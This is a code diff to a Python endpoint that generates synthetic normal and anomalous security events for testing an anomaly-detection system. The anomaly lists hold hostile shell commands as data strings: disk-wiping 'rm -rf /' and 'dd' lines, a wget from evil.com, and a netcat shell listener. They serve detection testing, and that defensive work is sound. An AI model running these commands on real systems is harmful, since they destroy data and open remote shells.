@@ -587,21 +587,35 @@ async def generate_test_data(db: Session = Depends(get_db)):
         events_created = []
         anomalies_created = []
         
-        # Generate normal user behavior patterns (80% of data)
-        normal_event_types = [
-            ('login', {'user_id': 'user1', 'auth_success': True, 'source_ip': '192.168.1.100'}),
-            ('file_change', {'user_id': 'user1', 'file_path': '/home/user1/document.txt', 'action': 'modify'}),
-            ('process_start', {'user_id': 'user1', 'process_name': 'browser', 'pid': random.randint(1000, 9999)}),
-            ('network_connection', {'user_id': 'user1', 'destination': 'google.com', 'port': 443}),
-            ('process_end', {'user_id': 'user1', 'process_name': 'browser', 'pid': random.randint(1000, 9999)}),
-            ('logout', {'user_id': 'user1', 'session_duration': random.randint(1800, 7200)}),
+        # Generate realistic normal user behavior patterns (80% of data)
+        users = ['alice', 'bob', 'charlie', 'diana', 'eve']
+        office_ips = ['192.168.1.100', '192.168.1.101', '192.168.1.102', '10.0.1.50', '10.0.1.51']
+        normal_websites = ['google.com', 'stackoverflow.com', 'github.com', 'microsoft.com', 'office365.com', 'slack.com']
+        normal_processes = ['chrome', 'firefox', 'code', 'outlook', 'teams', 'notepad', 'excel', 'word']
+        normal_files = ['/home/{}/documents/report.pdf', '/home/{}/projects/code.py', '/home/{}/downloads/file.zip']
+        
+        normal_patterns = [
+            # Morning login patterns
+            ('login', lambda u: {'user_id': u, 'auth_success': True, 'source_ip': random.choice(office_ips), 'login_type': 'workstation'}),
+            # Regular file operations
+            ('file_change', lambda u: {'user_id': u, 'file_path': random.choice(normal_files).format(u), 'action': random.choice(['modify', 'create', 'read']), 'file_size': random.randint(1024, 1048576)}),
+            # Normal process usage
+            ('process_start', lambda u: {'user_id': u, 'process_name': random.choice(normal_processes), 'pid': random.randint(1000, 9999), 'parent_pid': random.randint(500, 999)}),
+            # Regular web browsing
+            ('network_connection', lambda u: {'user_id': u, 'destination': random.choice(normal_websites), 'port': random.choice([80, 443, 8080]), 'protocol': 'https'}),
+            # Process cleanup
+            ('process_end', lambda u: {'user_id': u, 'process_name': random.choice(normal_processes), 'pid': random.randint(1000, 9999), 'exit_code': 0}),
+            # End of day logout
+            ('logout', lambda u: {'user_id': u, 'session_duration': random.randint(28800, 36000), 'logout_type': 'user_initiated'}),
         ]
         
-        # Generate 200 normal events
+        # Generate 200 normal events with realistic patterns
         base_time = datetime.now() - timedelta(days=7)
         
         for i in range(200):
-            event_type, metadata = random.choice(normal_event_types)
+            user = random.choice(users)
+            event_type, metadata_func = random.choice(normal_patterns)
+            metadata = metadata_func(user)
             
             # Vary timing to create realistic patterns
             time_offset = timedelta(
@@ -626,25 +640,36 @@ async def generate_test_data(db: Session = Depends(get_db)):
             db.add(event)
             events_created.append(event)
         
-        # Generate anomalous behavior patterns (20% of data)
+        # Generate sophisticated anomalous behavior patterns (20% of data)
+        suspicious_ips = ['203.0.113.1', '198.51.100.50', '185.220.100.240', '45.33.32.156', '104.244.42.1']
+        malicious_domains = ['malware-c2.evil', 'phishing-site.bad', 'botnet.xyz', 'ransomware.net', 'exploit-kit.com']
+        malicious_processes = ['cryptominer.exe', 'keylogger.dll', 'backdoor.sys', 'rootkit.bin', 'trojan.scr']
+        system_files = ['/etc/passwd', '/etc/shadow', '/boot/vmlinuz', '/var/log/auth.log', '/etc/hosts']
+        suspicious_commands = ['rm -rf /', 'dd if=/dev/urandom of=/dev/sda', 'wget http://evil.com/malware', 'nc -l -p 4444 -e /bin/sh']
+        
         anomaly_patterns = [
-            # Failed authentications
-            ('auth_failure', {'user_id': 'attacker', 'auth_success': False, 'source_ip': '10.0.0.50', 'attempts': random.randint(3, 10)}),
-            # Suspicious commands
-            ('sudo_command', {'user_id': 'user1', 'command': 'rm -rf /', 'elevation': 'sudo'}),
-            # Unusual network access
-            ('network_connection', {'user_id': 'user1', 'destination': 'suspicious-domain.com', 'port': 6666}),
-            # File tampering
-            ('file_change', {'user_id': 'user1', 'file_path': '/etc/passwd', 'action': 'modify'}),
-            # Process injection attempts
-            ('process_start', {'user_id': 'user1', 'process_name': 'backdoor.exe', 'pid': random.randint(1000, 9999)}),
-            # Off-hours access
-            ('login', {'user_id': 'user1', 'auth_success': True, 'source_ip': '192.168.1.100', 'time': '03:00:00'}),
+            # Brute force attacks
+            ('auth_failure', lambda: {'user_id': random.choice(['admin', 'root', 'administrator']), 'auth_success': False, 'source_ip': random.choice(suspicious_ips), 'attempts': random.randint(5, 50), 'attack_type': 'brute_force'}),
+            # Privilege escalation
+            ('sudo_command', lambda: {'user_id': random.choice(users), 'command': random.choice(suspicious_commands), 'elevation': 'sudo', 'unauthorized': True}),
+            # Command and control communication
+            ('network_connection', lambda: {'user_id': random.choice(users), 'destination': random.choice(malicious_domains), 'port': random.choice([4444, 6666, 8080, 9999]), 'protocol': 'tcp', 'suspicious': True}),
+            # System file tampering
+            ('file_change', lambda: {'user_id': random.choice(users), 'file_path': random.choice(system_files), 'action': 'modify', 'unauthorized': True, 'file_size': random.randint(0, 1024)}),
+            # Malware execution
+            ('process_start', lambda: {'user_id': random.choice(users), 'process_name': random.choice(malicious_processes), 'pid': random.randint(1000, 9999), 'suspicious': True, 'parent_pid': random.randint(1, 100)}),
+            # Off-hours access from suspicious locations
+            ('login', lambda: {'user_id': random.choice(users), 'auth_success': True, 'source_ip': random.choice(suspicious_ips), 'unusual_time': True, 'geo_anomaly': True}),
+            # Data exfiltration attempts
+            ('network_connection', lambda: {'user_id': random.choice(users), 'destination': random.choice(suspicious_ips), 'port': 443, 'data_volume': random.randint(100000000, 1000000000), 'exfiltration': True}),
+            # Lateral movement
+            ('network_connection', lambda: {'user_id': random.choice(users), 'destination': f'192.168.1.{random.randint(1,254)}', 'port': random.choice([22, 23, 135, 445]), 'lateral_movement': True}),
         ]
         
-        # Generate 50 anomalous events
+        # Generate 50 anomalous events with varied attack patterns
         for i in range(50):
-            event_type, metadata = random.choice(anomaly_patterns)
+            event_type, metadata_func = random.choice(anomaly_patterns)
+            metadata = metadata_func()
             
             # Anomalies at random times, including off-hours
             time_offset = timedelta(
